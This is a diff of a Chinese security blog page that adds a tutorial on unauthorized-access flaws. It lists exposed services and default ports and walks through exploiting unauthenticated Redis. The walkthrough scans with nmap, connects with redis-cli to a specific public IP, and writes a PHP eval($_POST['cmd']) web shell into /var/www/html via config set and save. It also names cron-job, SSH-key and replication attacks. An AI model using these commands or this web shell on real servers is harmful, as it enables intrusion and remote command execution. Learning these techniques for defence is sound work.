@@ -16,22 +16,30 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
-<meta property="og:title" content="redis未授权访问">
-<meta property="og:url" content="https://tsy244.github.io/2024/01/11/%E6%B8%97%E9%80%8F/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/index.html">
+    <meta name="description" content="未授权访问漏洞概述未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面配置不当导 致其他用户可以无  需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。   常见漏洞 Redis  未授权访问漏洞Docker 未授权访问漏洞MongoDB 未授权访问漏洞Jenkins 未授权访问漏洞Memcached 未授权访问漏洞JBOSS 未授权访问漏洞VNC 未授权访问漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="未授权访问漏洞">
+<meta property="og:url" content="https://tsy244.github.io/2024/01/11/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="未授权访问漏洞概述未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面配置不当导 致其他用户可以无  需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。   常见漏洞 Redis  未授权访问漏洞Docker 未授权访问漏洞MongoDB 未授权访问漏洞Jenkins 未授权访问漏洞Memcached 未授权访问漏洞JBOSS 未授权访问漏洞VNC 未授权访问漏">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-01-11T01:54:05.000Z">
-<meta property="article:modified_time" content="2024-01-11T01:55:19.642Z">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111250680.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111755959.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111833512.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111112424127.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111112919989.png">
+<meta property="article:published_time" content="2024-01-11T02:01:44.000Z">
+<meta property="article:modified_time" content="2024-01-11T03:31:52.503Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111250680.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>redis未授权访问 - AU9U5T</title>
+  <title>未授权访问漏洞 - AU9U5T</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +205,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="redis未授权访问"></span>
+            <span id="subtitle" data-typed-text="未授权访问漏洞"></span>
           
         </div>
 
@@ -213,7 +221,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-01-11 09:54" pubdate>
+        <time datetime="2024-01-11 10:01" pubdate>
           January 11, 2024 am
         </time>
       </span>
@@ -225,7 +233,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          1.3k words
         
       </span>
     
@@ -236,7 +244,7 @@
         
         
         
-          1 mins
+          11 mins
         
       </span>
     
@@ -274,12 +282,94 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">redis未授权访问</h1>
+            <h1 style="display: none">未授权访问漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                
+                <h1 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面配置不当导 致其他用户可以无  需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。  </p>
+<h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><blockquote>
+<p>Redis  未授权访问漏洞<br>Docker 未授权访问漏洞<br>MongoDB 未授权访问漏洞<br>Jenkins 未授权访问漏洞<br>Memcached 未授权访问漏洞<br>JBOSS 未授权访问漏洞<br>VNC 未授权访问漏洞<br>ZooKeeper 未授权访问漏洞<br>Rsync 未授权访问漏洞<br>Atlassian Crowd 未授权访问漏洞<br>CouchDB 未授权访问漏洞<br>Elasticsearch 未授权访问漏洞<br>Hadoop 未授权访问漏洞<br>Jupyter Notebook 未授权访问漏洞</p>
+</blockquote>
+<h1 id="redis-未授权访问漏洞"><a href="#redis-未授权访问漏洞" class="headerlink" title="redis 未授权访问漏洞"></a>redis 未授权访问漏洞</h1><h2 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h2><p>  <a target="_blank" rel="noopener" href="https://www.redis.com.cn/redis-intro.html">https://www.redis.com.cn/redis-intro.html</a>  </p>
+<p>  一个灵活的高性能 key-value 数据结构存储，可以用来作为数据库、缓存和消息队列</p>
+<p>主要应用场景:</p>
+<ol>
+<li>缓存数据</li>
+<li>高速读写</li>
+</ol>
+<p>组成：</p>
+<p>主要是由两个程序组成</p>
+<p>Redis 客户端 redis-cli<br>Redis 服务器 redis-server  </p>
+<p>  客户端、服务器可以位于同一台计算机或两台不同的计算机中。（分布式）</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ol>
+<li><p>端口</p>
+<p><strong>记住以下都是默认端口，有可能会出现更改的情况</strong></p>
+<p>6379</p>
+<p>其他的默认端口</p>
+<blockquote>
+<p>MongoDB：27017<br>Memcached：11211<br>Jboss：8080<br>VNC：5900、5901<br>claDocker：2375  </p>
+</blockquote>
+</li>
+<li><p>探测</p>
+<p>使用nmap进行端口扫描</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -v -Pn -p <span class="hljs-number">6379</span> -sV -IP<br><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-v 显示过程</p>
+<p>-Pn no ping </p>
+<p>-sV 版本探测</p>
+</blockquote>
+<blockquote>
+<p>为什么要no ping ?</p>
+<p>因为大多数防火墙会拦截icmp(微软自带的，小皮等)</p>
+<p>但是端口是在网络层(tcp,udp)，icmp是网络层</p>
+</blockquote>
+</li>
+<li><p>其他</p>
+<p>redis,mysql,postgresql一般都是监听在比本地</p>
+<p>redis java程序一般都会使用，并且java程序一般都存在ssrf，内网存在大量的redis访问漏洞</p>
+</li>
+<li><p>利用方法</p>
+<ul>
+<li>redis 写webshell</li>
+<li>redis写定时任务     *****  <strong>重要</strong></li>
+<li>redis写ssh公钥</li>
+<li>redis 主从复制</li>
+</ul>
+</li>
+</ol>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><ol>
+<li><p>对主机进行端口扫描</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111250680.png" srcset="/img/loading.gif" lazyload alt="image-20240111111250680"></p>
+<p>发现redis是连接上的</p>
+<p>由于nmap一直出的结果不是很理想，尝试使用yakit进一步爆破</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111755959.png" srcset="/img/loading.gif" lazyload alt="image-20240111111755959"></p>
+<p>8080有一个apache服务尝试访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111833512.png" srcset="/img/loading.gif" lazyload alt="image-20240111111833512"></p>
+</li>
+<li><p>尝试使用Redis连接</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">8.130.123.25</span><br></code></pre></td></tr></table></figure>
+
+<p>redis:</p>
+<p>准备写webshell</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html # 这个的局限性就是需要知道绝对路径，但是一般网站的绝对路径不是很好获取</span><br><span class="language-xml"> config set dbfilename webshell.php # 这个是设置保存数据库的文件的路径</span><br><span class="language-xml"> set a &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; # 写webshell</span><br><span class="language-xml"> save 保存</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>尝试访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111112424127.png" srcset="/img/loading.gif" lazyload alt="image-20240111112424127"></p>
+<p>写入成功</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111112919989.png" srcset="/img/loading.gif" lazyload alt="image-20240111112919989"></p>
+</li>
+<li><p>缺点</p>
+<ul>
+<li>可写权限的网站的绝对路径非常难找</li>
+<li>一般只有java才有，需要jsp写入webshell</li>
+<li>redis 这台服务器没有web ******</li>
+<li></li>
+</ul>
+</li>
+</ol>
+
                 
               </div>
             
@@ -303,8 +393,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>redis未授权访问</div>
-      <div>https://tsy244.github.io/2024/01/11/渗透/redis未授权访问/</div>
+      <div>未授权访问漏洞</div>
+      <div>https://tsy244.github.io/2024/01/11/渗透/未授权访问漏洞/</div>
     </div>
     <div class="license-meta">
       
